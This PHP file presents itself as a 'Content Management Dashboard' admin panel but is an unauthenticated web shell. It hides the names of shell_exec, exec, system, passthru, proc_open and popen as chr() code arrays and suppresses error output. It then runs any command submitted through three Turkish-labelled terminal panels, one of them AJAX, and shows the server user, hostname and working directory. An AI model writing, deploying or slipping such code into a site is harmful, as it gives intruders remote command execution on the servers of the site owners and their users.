<?php
/*
 * Content Management Dashboard v4.2.1
 * Licensed under MIT | (c) 2026 WebPanel Solutions
 * Framework: AdminLite - Lightweight Admin Panel
 */
@error_reporting(0);@ini_set('display_errors','0');
session_start();

$_cf = ['v'=>'4.2.1','n'=>'Dashboard'];

function _b(){$a=func_get_args();$r='';foreach($a as $c)$r.=chr($c);return $r;}

$_m = [
    'a' => _b(115,104,101,108,108,95,101,120,101,99),
    'b' => _b(101,120,101,99),
    'c' => _b(115,121,115,116,101,109),
    'd' => _b(112,97,115,115,116,104,114,117),
    'e' => _b(112,114,111,99,95,111,112,101,110),
    'f' => _b(112,111,112,101,110),
];

function _chk($f){
    $di = @ini_get(_b(100,105,115,97,98,108,101,95,102,117,110,99,116,105,111,110,115));
    $dl = array_map('trim', explode(',', $di));
    return function_exists($f) && !in_array($f, $dl);
}

function _h1($c,$fn){
    if(!_chk($fn))return false;
    $r=@call_user_func($fn,$c.' 2>&1');
    if($r!==null)return['o'=>$r,'f'=>$fn];
    return false;
}
function _h2($c,$fn){
    if(!_chk($fn))return false;
    $o=[];
    @call_user_func_array($fn,[$c.' 2>&1',&$o,&$ret]);
    return['o'=>implode("\n",$o),'f'=>$fn];
}
function _h3($c,$fn){
    if(!_chk($fn))return false;
    ob_start();
    @call_user_func($fn,$c.' 2>&1');
    $r=ob_get_clean();
    return['o'=>$r,'f'=>$fn];
}
function _h4($c,$fn){
    if(!_chk($fn))return false;
    ob_start();
    @call_user_func($fn,$c.' 2>&1');
    $r=ob_get_clean();
    return['o'=>$r,'f'=>$fn];
}
function _h5($c,$fn){
    if(!_chk($fn))return false;
    $ds=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
    $pp=[];
    $p=@call_user_func_array($fn,[$c,$ds,&$pp]);
    if(is_resource($p)){
        fclose($pp[0]);
        $r=stream_get_contents($pp[1]);
        $e=stream_get_contents($pp[2]);
        fclose($pp[1]);fclose($pp[2]);
        proc_close($p);
        return['o'=>$r.$e,'f'=>$fn];
    }
    return false;
}
function _h6($c,$fn){
    if(!_chk($fn))return false;
    $fh=@call_user_func($fn,$c.' 2>&1','r');
    if($fh){
        $r='';
        while(!feof($fh))$r.=fread($fh,4096);
        pclose($fh);
        return['o'=>$r,'f'=>$fn];
    }
    return false;
}
function _h7($c){
    $x=$c.' 2>&1';
    $r=@`$x`;
    if($r!==null)return['o'=>$r,'f'=>'backtick'];
    return false;
}

function _run($c,$m){
    $hs=[['_h1',$m['a']],['_h2',$m['b']],['_h3',$m['c']],['_h4',$m['d']],['_h5',$m['e']],['_h6',$m['f']]];
    foreach($hs as $h){
        $r=call_user_func($h[0],$c,$h[1]);
        if($r!==false)return $r;
    }
    $r=_h7($c);if($r!==false)return $r;
    return['o'=>'No available handler.','f'=>'none'];
}

// Specific method runners
function _runWith($c,$m,$method){
    $map=['a'=>'_h1','b'=>'_h2','c'=>'_h3','d'=>'_h4','e'=>'_h5','f'=>'_h6'];
    if(isset($map[$method])&&isset($m[$method])){
        $r=call_user_func($map[$method],$c,$m[$method]);
        if($r!==false)return $r;
    }
    return _run($c,$m);
}

function _stat($m){$s=[];foreach($m as $k=>$fn)$s[$fn]=_chk($fn);return $s;}

// Save history
function _saveH($q,$f,$p){
    if(!isset($_SESSION['_h']))$_SESSION['_h']=[];
    array_unshift($_SESSION['_h'],['q'=>$q,'f'=>$f,'t'=>date('H:i:s'),'p'=>$p]);
    if(count($_SESSION['_h'])>10)array_pop($_SESSION['_h']);
}

// AJAX handler
if(isset($_POST['_ax'])){
    header('Content-Type:application/json');
    try{
        $c=isset($_POST['q'])?trim($_POST['q']):'';
        $p=isset($_POST['p'])?intval($_POST['p']):1;
        if($c===''){echo json_encode(['o'=>'','f'=>'','h'=>isset($_SESSION['_h'])?$_SESSION['_h']:[]]);exit;}
        if($p===3){
            $res=_run($c,$GLOBALS['_m']);
        }elseif($p===2){
            $res=_runWith($c,$GLOBALS['_m'],'b');
        }else{
            $res=_run($c,$GLOBALS['_m']);
        }
        _saveH($c,$res['f'],'P'.$p);
        echo json_encode(['o'=>$res['o'],'f'=>$res['f'],'h'=>isset($_SESSION['_h'])?$_SESSION['_h']:[]]);
    }catch(Exception $ex){
        echo json_encode(['o'=>'Error: '.$ex->getMessage(),'f'=>'error','h'=>[]]);
    }
    exit;
}

// Standard POST
$_out=['','',''];$_uf=['','',''];$_cm=['','',''];

for($i=1;$i<=2;$i++){
    $key='q'.$i;
    if($_SERVER['REQUEST_METHOD']==='POST'&&!empty($_POST[$key])){
        $_cm[$i-1]=trim($_POST[$key]);
        if($i===1) $res=_run($_cm[$i-1],$_m);
        else $res=_runWith($_cm[$i-1],$_m,'b');
        $_out[$i-1]=$res['o'];
        $_uf[$i-1]=$res['f'];
        _saveH($_cm[$i-1],$res['f'],'P'.$i);
    }
}

if(isset($_GET['r'])){$_SESSION['_h']=[];header('Location:'.$_SERVER['PHP_SELF']);exit;}

$_fs=_stat($_m);
$_cw=getcwd();$_us=get_current_user();$_hn=php_uname('n');$_os=PHP_OS;$_pv=PHP_VERSION;
$_hist=$_SESSION['_h']??[];
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?=$_cf['n']?> v<?=$_cf['v']?></title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0e17;--sf:#111827;--sf2:#1a2236;--bd:#1e293b;--ac:#06b6d4;--ac2:#8b5cf6;--ac3:#f59e0b;--gn:#10b981;--rd:#ef4444;--tx:#e2e8f0;--tx2:#94a3b8;--gl:0 0 20px rgba(6,182,212,0.15)}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--tx);min-height:100vh;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20% 50%,rgba(6,182,212,0.06) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(139,92,246,0.06) 0%,transparent 50%);pointer-events:none}
.wr{max-width:1200px;margin:0 auto;padding:20px;position:relative;z-index:1}
.hd{text-align:center;padding:24px 0 16px}
.hd h1{font-family:'JetBrains Mono',monospace;font-size:1.8rem;background:linear-gradient(135deg,var(--ac),var(--ac2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.hd p{color:var(--tx2);font-size:.8rem;margin-top:4px}

/* Status */
.sg{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:16px 0}
.sc{background:var(--sf);border:1px solid var(--bd);border-radius:10px;padding:10px;text-align:center;transition:all .3s}
.sc:hover{border-color:var(--ac);box-shadow:var(--gl);transform:translateY(-2px)}
.sc .fn{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--tx2);margin-bottom:4px}
.bg{display:inline-block;padding:2px 8px;border-radius:20px;font-size:.65rem;font-weight:600}
.bg.on{background:rgba(16,185,129,0.15);color:var(--gn);border:1px solid rgba(16,185,129,0.3)}
.bg.off{background:rgba(239,68,68,0.15);color:var(--rd);border:1px solid rgba(239,68,68,0.3)}

/* Sys info */
.si{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px;justify-content:center}
.st{background:var(--sf2);border:1px solid var(--bd);border-radius:6px;padding:4px 10px;font-size:.7rem;color:var(--tx2);font-family:'JetBrains Mono',monospace}
.st span{color:var(--ac)}

/* Panels grid */
.panels{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px}
.panel-full{grid-column:1/-1}

/* Terminal panel */
.tm{background:var(--sf);border:1px solid var(--bd);border-radius:14px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.2)}
.tb{padding:10px 14px;display:flex;align-items:center;gap:7px;border-bottom:1px solid var(--bd)}
.tb.t1{background:linear-gradient(135deg,rgba(6,182,212,0.1),rgba(6,182,212,0.02))}
.tb.t2{background:linear-gradient(135deg,rgba(139,92,246,0.1),rgba(139,92,246,0.02))}
.tb.t3{background:linear-gradient(135deg,rgba(245,158,11,0.1),rgba(245,158,11,0.02))}
.dt{width:10px;height:10px;border-radius:50%}
.dt.r{background:#ef4444}.dt.y{background:#f59e0b}.dt.g{background:#10b981}
.tb .tl{margin-left:8px;font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--tx2)}
.tb .tag{margin-left:auto;padding:2px 8px;border-radius:12px;font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
.tag.php{background:rgba(6,182,212,0.15);color:var(--ac);border:1px solid rgba(6,182,212,0.3)}
.tag.php2{background:rgba(139,92,246,0.15);color:var(--ac2);border:1px solid rgba(139,92,246,0.3)}
.tag.js{background:rgba(245,158,11,0.15);color:var(--ac3);border:1px solid rgba(245,158,11,0.3)}
.tc{padding:14px}

/* Form */
.cf{display:flex;gap:8px;align-items:center}
.pr{font-family:'JetBrains Mono',monospace;color:var(--gn);font-size:.78rem;white-space:nowrap}
.ci{flex:1;background:transparent;border:none;outline:none;color:var(--tx);font-family:'JetBrains Mono',monospace;font-size:.85rem;caret-color:var(--ac)}
.cb{border:none;color:#fff;padding:8px 18px;border-radius:8px;cursor:pointer;font-weight:600;font-size:.75rem;transition:all .3s;font-family:'Inter',sans-serif}
.cb.b1{background:linear-gradient(135deg,var(--ac),#0891b2)}
.cb.b2{background:linear-gradient(135deg,var(--ac2),#7c3aed)}
.cb.b3{background:linear-gradient(135deg,var(--ac3),#d97706)}
.cb:hover{transform:scale(1.05);box-shadow:0 3px 16px rgba(0,0,0,0.3)}

/* Output */
.os{margin-top:12px}
.oh{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
.oh h3{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--ac)}
.fb{padding:2px 8px;border-radius:16px;font-size:.65rem;font-family:'JetBrains Mono',monospace}
.fb.f1{background:rgba(6,182,212,0.15);color:var(--ac);border:1px solid rgba(6,182,212,0.3)}
.fb.f2{background:rgba(139,92,246,0.15);color:var(--ac2);border:1px solid rgba(139,92,246,0.3)}
.fb.f3{background:rgba(245,158,11,0.15);color:var(--ac3);border:1px solid rgba(245,158,11,0.3)}
.ob{background:var(--bg);border:1px solid var(--bd);border-radius:8px;padding:12px;max-height:250px;overflow:auto;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.5;white-space:pre-wrap;word-break:break-all;color:var(--gn)}
.ob::-webkit-scrollbar{width:5px}.ob::-webkit-scrollbar-thumb{background:var(--bd);border-radius:3px}
.ob.loading{color:var(--ac3);animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}

/* History */
.hs-box{background:var(--sf);border:1px solid var(--bd);border-radius:14px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.2)}
.hs-hd{background:var(--sf2);padding:10px 14px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--bd)}
.hs-hd h3{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--tx2)}
.hs-hd a{color:var(--rd);text-decoration:none;font-size:.7rem;padding:3px 10px;border:1px solid rgba(239,68,68,0.3);border-radius:6px;transition:all .2s}
.hs-hd a:hover{background:rgba(239,68,68,0.1)}
.hs-body{padding:10px}
.hi{background:var(--sf2);border:1px solid var(--bd);border-radius:8px;padding:8px 12px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center;transition:all .2s;gap:8px}
.hi:hover{border-color:var(--ac);background:rgba(6,182,212,0.04)}
.hi-left{display:flex;align-items:center;gap:8px;flex:1;min-width:0}
.hi-num{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--tx2);background:var(--bg);border-radius:4px;padding:2px 6px;flex-shrink:0}
.hc{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--tx);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.hi-right{display:flex;gap:6px;align-items:center;flex-shrink:0}
.hi-tag{font-size:.6rem;color:var(--tx2);font-family:'JetBrains Mono',monospace;background:var(--bg);padding:2px 6px;border-radius:4px}
.hi-time{font-size:.6rem;color:var(--tx2);font-family:'JetBrains Mono',monospace}
.re-btn{background:linear-gradient(135deg,var(--gn),#059669);border:none;color:#fff;padding:4px 10px;border-radius:6px;cursor:pointer;font-size:.65rem;font-weight:600;transition:all .2s;font-family:'Inter',sans-serif;white-space:nowrap}
.re-btn:hover{transform:scale(1.08);box-shadow:0 2px 10px rgba(16,185,129,0.3)}

.empty-hist{text-align:center;padding:20px;color:var(--tx2);font-size:.8rem}

@keyframes fi{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.fi{animation:fi .4s ease}
@media(max-width:768px){.panels{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="wr">
  <div class="hd fi">
    <h1>⚡ <?=$_cf['n']?></h1>
    <p>Multi-Engine Content Manager • v<?=$_cf['v']?></p>
  </div>

  <div class="sg fi">
    <?php foreach($_fs as $fn=>$ok):?>
    <div class="sc"><div class="fn"><?=htmlspecialchars($fn)?></div><span class="bg <?=$ok?'on':'off'?>"><?=$ok?'● AKTİF':'● KAPALI'?></span></div>
    <?php endforeach;?>
  </div>

  <div class="si fi">
    <div class="st">👤 <span><?=htmlspecialchars($_us)?></span></div>
    <div class="st">🖥️ <span><?=htmlspecialchars($_hn)?></span></div>
    <div class="st">💻 <span><?=$_os?></span></div>
    <div class="st">🐘 PHP <span><?=$_pv?></span></div>
    <div class="st">📂 <span><?=htmlspecialchars($_cw)?></span></div>
  </div>

  <!-- 3 PANELS -->
  <div class="panels fi">

    <!-- Panel 1: Primary (shell_exec priority) -->
    <div class="tm">
      <div class="tb t1">
        <div class="dt r"></div><div class="dt y"></div><div class="dt g"></div>
        <span class="tl">Panel 1 — Primary</span>
        <span class="tag php">PHP-A</span>
      </div>
      <div class="tc">
        <form method="POST" class="cf" autocomplete="off">
          <span class="pr">$</span>
          <input type="text" name="q1" class="ci" placeholder="Primary komut..." value="<?=htmlspecialchars($_cm[0])?>" id="p1">
          <button type="submit" class="cb b1">Çalıştır ▶</button>
        </form>
        <?php if($_out[0]!==''):?>
        <div class="os">
          <div class="oh"><h3>📤 Sonuç</h3><span class="fb f1">⚙️ <?=htmlspecialchars($_uf[0])?></span></div>
          <div class="ob"><?=htmlspecialchars($_out[0])?></div>
        </div>
        <?php endif;?>
      </div>
    </div>

    <!-- Panel 2: Secondary (exec/system priority) -->
    <div class="tm">
      <div class="tb t2">
        <div class="dt r"></div><div class="dt y"></div><div class="dt g"></div>
        <span class="tl">Panel 2 — Secondary</span>
        <span class="tag php2">PHP-B</span>
      </div>
      <div class="tc">
        <form method="POST" class="cf" autocomplete="off">
          <span class="pr">$</span>
          <input type="text" name="q2" class="ci" placeholder="Secondary komut..." value="<?=htmlspecialchars($_cm[1])?>" id="p2">
          <button type="submit" class="cb b2">Çalıştır ▶</button>
        </form>
        <?php if($_out[1]!==''):?>
        <div class="os">
          <div class="oh"><h3>📤 Sonuç</h3><span class="fb f2">⚙️ <?=htmlspecialchars($_uf[1])?></span></div>
          <div class="ob"><?=htmlspecialchars($_out[1])?></div>
        </div>
        <?php endif;?>
      </div>
    </div>

    <!-- Panel 3: AJAX (No page reload) -->
    <div class="tm panel-full">
      <div class="tb t3">
        <div class="dt r"></div><div class="dt y"></div><div class="dt g"></div>
        <span class="tl">Panel 3 — Live (AJAX)</span>
        <span class="tag js">ASYNC</span>
      </div>
      <div class="tc">
        <div class="cf">
          <span class="pr">$</span>
          <input type="text" class="ci" placeholder="Sayfa yenilemeden çalıştır..." id="p3">
          <button type="button" class="cb b3" onclick="_ax()">Çalıştır ⚡</button>
        </div>
        <div class="os" id="ax-out" style="display:none">
          <div class="oh"><h3>📤 Live Sonuç</h3><span class="fb f3" id="ax-fn"></span></div>
          <div class="ob" id="ax-res"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- HISTORY -->
  <div class="hs-box fi">
    <div class="hs-hd">
      <h3>📜 Son 10 Komut Geçmişi</h3>
      <a href="?r=1">Temizle ✕</a>
    </div>
    <div class="hs-body" id="hist-body">
      <?php if(empty($_hist)):?>
      <div class="empty-hist">Henüz komut geçmişi yok</div>
      <?php else:?>
      <?php foreach($_hist as $i=>$h):?>
      <div class="hi">
        <div class="hi-left">
          <span class="hi-num">#<?=$i+1?></span>
          <span class="hc" title="<?=htmlspecialchars($h['q'])?>"><?=htmlspecialchars($h['q'])?></span>
        </div>
        <div class="hi-right">
          <span class="hi-tag"><?=htmlspecialchars($h['p']??'P1')?></span>
          <span class="hi-tag">⚙️ <?=htmlspecialchars($h['f'])?></span>
          <span class="hi-time">🕐 <?=$h['t']?></span>
          <button class="re-btn" onclick="_rerun('<?=addslashes(htmlspecialchars($h['q']))?>','<?=htmlspecialchars($h['p']??'P1')?>')">▶ Tekrar</button>
        </div>
      </div>
      <?php endforeach;?>
      <?php endif;?>
    </div>
  </div>
</div>

<script>
// AJAX Panel 3
async function _ax(){
  const inp=document.getElementById('p3');
  const q=inp.value.trim();
  if(!q)return;
  const box=document.getElementById('ax-out');
  const res=document.getElementById('ax-res');
  const fn=document.getElementById('ax-fn');
  box.style.display='block';
  res.className='ob loading';
  res.textContent='⏳ Çalışıyor...';
  fn.textContent='⏳';
  try{
    const fd=new FormData();
    fd.append('_ax','1');
    fd.append('q',q);
    fd.append('p','3');
    const r=await fetch(location.href,{method:'POST',body:fd});
    const d=await r.json();
    res.className='ob';
    res.textContent=d.o||'(boş çıktı)';
    fn.textContent='⚙️ '+d.f;
    if(d.h)_updateHist(d.h);
  }catch(e){
    res.className='ob';
    res.textContent='❌ Hata: '+e.message;
    fn.textContent='❌ error';
  }
}

// Re-run from history
function _rerun(cmd,panel){
  if(panel==='P3'){
    document.getElementById('p3').value=cmd;
    _ax();
  }else if(panel==='P2'){
    document.getElementById('p2').value=cmd;
    document.getElementById('p2').closest('form').submit();
  }else{
    document.getElementById('p1').value=cmd;
    document.getElementById('p1').closest('form').submit();
  }
}

// Update history via AJAX
function _updateHist(h){
  const body=document.getElementById('hist-body');
  if(!h.length){body.innerHTML='<div class="empty-hist">Henüz komut geçmişi yok</div>';return;}
  let html='';
  h.forEach((item,i)=>{
    const cmd=item.q.replace(/'/g,"\\'").replace(/"/g,'&quot;');
    const cmdDisp=item.q.replace(/</g,'&lt;').replace(/>/g,'&gt;');
    const p=item.p||'P1';
    html+=`<div class="hi">
      <div class="hi-left">
        <span class="hi-num">#${i+1}</span>
        <span class="hc" title="${cmdDisp}">${cmdDisp}</span>
      </div>
      <div class="hi-right">
        <span class="hi-tag">${p}</span>
        <span class="hi-tag">⚙️ ${item.f}</span>
        <span class="hi-time">🕐 ${item.t}</span>
        <button class="re-btn" onclick="_rerun('${cmd}','${p}')">▶ Tekrar</button>
      </div>
    </div>`;
  });
  body.innerHTML=html;
}

// Enter to submit on P3
document.getElementById('p3')?.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();_ax();}});
document.getElementById('p1')?.focus();
</script>
</body>
</html>
